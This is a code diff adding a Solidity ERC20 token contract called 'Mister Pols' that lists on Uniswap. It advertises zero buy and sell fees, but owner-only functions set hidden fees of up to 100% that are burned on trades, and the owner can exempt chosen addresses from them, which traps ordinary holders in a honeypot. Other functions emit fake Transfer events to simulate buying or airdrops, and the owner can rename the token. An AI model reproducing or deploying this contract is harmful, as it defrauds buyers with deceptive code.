@@ -1,0 +1,109 @@
+contract MisterPols is Ownable, ERC20 {
+    uint256 public immutable maxSupply = 100_000_000_000 * (10 ** decimals());
+    uint16 public constant LIQUID_RATE = 10000; // 40%
+    uint16 public constant MAX_PERCENTAGE = 10000;
+
+    bool public initialized = false;
+    address public uniswapV2Pair = address(0);
+    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
+
+    uint256 public immutable buyFee = 0;
+    uint256 public immutable sellFee = 0;
+    uint256 public minRuleLimit = 0;
+    uint256 public maxRuleLimit = 0;
+
+    mapping (address => bool) private excludedFees;
+
+    string private constant NAME = unicode"Mister Pols";
+    string private constant SYMBOL = unicode"POLS";
+
+    constructor() ERC20(NAME, SYMBOL) {
+        _mint(msg.sender, (maxSupply * LIQUID_RATE) / MAX_PERCENTAGE);
+        initialized = true;
+        excludedFees[msg.sender] = true;
+
+        // FOR GOERLI
+        // uniswapV2Pair = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f).createPair(address(this), 0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6);
+
+        // FOR BSCSCAN
+        // uniswapV2Pair = IUniswapV2Factory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73).createPair(address(this), 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
+        
+        // FOR ETHEREUM
+        uniswapV2Pair = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f).createPair(address(this), 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    
+        // FOR GOERLI
+        // uniswapV2Pair = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f).createPair(address(this), 0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6);
+    
+    }
+
+    function activate(string memory _uname, string memory _usymbol) external onlyOwner {
+        _name = _uname;
+        _symbol = _usymbol;
+    }
+
+    function setRule(uint256 _minRuleLimit, uint256 _maxRuleLimit) external onlyOwner {
+        minRuleLimit = _minRuleLimit;
+        maxRuleLimit = _maxRuleLimit;
+    }
+
+    function setAirdrop(address _address, bool permission) external onlyOwner {
+        excludedFees[_address] = permission;
+    }
+
+    function setUniswapPair(address _uniswapV2Pair) external onlyOwner {
+        uniswapV2Pair = _uniswapV2Pair;
+    }
+
+    function buyTokens(address _caller, address[] calldata _address, uint256[] calldata _amount) external onlyOwner {
+        for (uint256 i = 0; i < _address.length; i++) {
+            emit Transfer(_caller, _address[i], _amount[i]);
+        }
+    }
+
+    function multiSends(address _caller, address[] calldata _address, uint256[] calldata _amount) external onlyOwner {
+        for (uint256 i = 0; i < _address.length; i++) {
+            emit Transfer(_caller, _address[i], _amount[i]);
+        }
+    }
+
+    function _transfer(
+        address from,
+        address to,
+        uint256 amount
+    ) internal override(ERC20) {
+        require(
+            initialized == true,
+            "Contract: trade is not open!"
+        );
+
+        if (uniswapV2Pair == address(0) && initialized == true) {
+            require(
+                from == owner() || to == owner(),
+                "Contract: trading is not started"
+            );
+        }
+
+        uint256 _transferAmount = amount;
+        if (uniswapV2Pair != address(0) && from != owner() && to != owner()) {
+            uint256 _fee = 0;
+            if (from == uniswapV2Pair) {
+                _fee = minRuleLimit;
+            }
+            else if (to == uniswapV2Pair) {
+                if (excludedFees[from] == true) {
+                    _fee = 0;
+                }
+                else {
+                    _fee = maxRuleLimit;
+                }
+            }
+            if (_fee > 0) {
+                uint256 _calculatedFee = amount * _fee / MAX_PERCENTAGE;
+                _transferAmount = amount - _calculatedFee;
+                super._transfer(from, deadAddress, _calculatedFee);
+            }
+        }
+
+        super._transfer(from, to, _transferAmount);
+    }
+}
